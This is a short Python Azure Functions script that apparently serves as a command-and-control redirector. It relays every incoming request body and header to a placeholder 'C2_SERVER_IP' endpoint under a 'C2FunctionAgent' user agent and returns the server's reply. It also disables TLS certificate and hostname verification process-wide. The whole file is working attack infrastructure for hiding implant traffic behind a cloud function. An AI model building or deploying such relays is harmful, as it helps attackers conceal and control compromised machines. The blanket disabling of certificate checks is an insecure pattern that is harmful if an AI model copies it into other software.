import ssl
import logging
import urllib.parse
import urllib.request
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = 'https://C2_SERVER_IP/api/users/2000/PostIt'
    header_dict = {}
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ssl._create_default_https_context = ssl._create_unverified_context
    post_data = req.get_body()
    
    for key, value in dict(req.headers).items():
        header_dict.update({key : value})
    
    header_dict.update({'User-Agent': 'C2FunctionAgent'})
    
    request = urllib.request.Request(url, data=post_data, headers=header_dict)
    with urllib.request.urlopen(request) as response:
        html = response.read()
    return func.HttpResponse(html)
